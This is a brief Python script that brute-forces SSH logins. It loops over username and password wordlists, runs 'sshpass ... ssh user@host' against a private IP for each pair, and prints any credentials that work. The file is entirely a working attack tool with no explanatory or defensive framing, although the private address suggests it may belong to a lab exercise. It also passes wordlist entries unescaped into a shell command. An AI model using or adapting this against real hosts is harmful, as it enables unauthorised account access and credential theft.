#!/bin/python3
from pathlib import Path
from subprocess import run

def processList(inp = ""):
    with open(inp, "r+") as f:
            tmp = f.readlines()
    lst = []
    for k in tmp:
        lst.append(k.strip())
    return lst




def getSshCredsAndConn(ulist="",plist="",domain=""):   
    uname = processList(ulist) # "./init/userlist"
    passwd = processList(plist) # "./init/passlist"
    retUsr = "x"
    retPass= "x" 
    for user in uname:
        for password in passwd:
            command = f"sshpass -p {password} ssh {user}@{domain}"
            print(f"Trying to execute: '{command}' ")
            proc = run(command,shell=True)
            print(f"$? = {proc.returncode}")
            if proc.returncode == 0 :
                print(f"SSH password for {user} in {domain} is {password}")
                retUsr = user
                retPass = password
                break
        if proc.returncode == 0:
            break
    return (retUsr,retPass)

usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain="192.168.1.45")

print(f"user = {usr} | password={pwd}")